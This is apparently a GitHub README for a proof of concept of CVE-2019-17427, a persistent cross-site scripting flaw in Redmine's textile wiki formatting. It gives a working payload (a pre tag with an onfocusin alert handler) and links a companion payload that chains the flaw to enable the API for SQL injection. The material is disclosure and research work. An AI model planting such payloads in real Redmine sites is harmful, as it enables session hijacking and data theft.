# CVE-2019-17427
CVE-2019-17427 Persistent XSS POC  

In Redmine before 3.4.11 and 4.0.x before 4.0.4, persistent XSS exists due to textile formatting errors.  

The vulnerability essentially exists on any wiki page which by default uses textile formatting. You can take advantage of it by using <pre parameter.  

<code><pre onfocusin=alert("pwnd") tabindex=1 style="height:500px;width:500px;" class=</code>

To take full advantage of this, you can chain the poc.txt which contains XSS example payload to enable API in order to achieve SQL injection capabilities https://github.com/RealLinkers/CVE-2019-18890  

https://nvd.nist.gov/vuln/detail/CVE-2019-17427
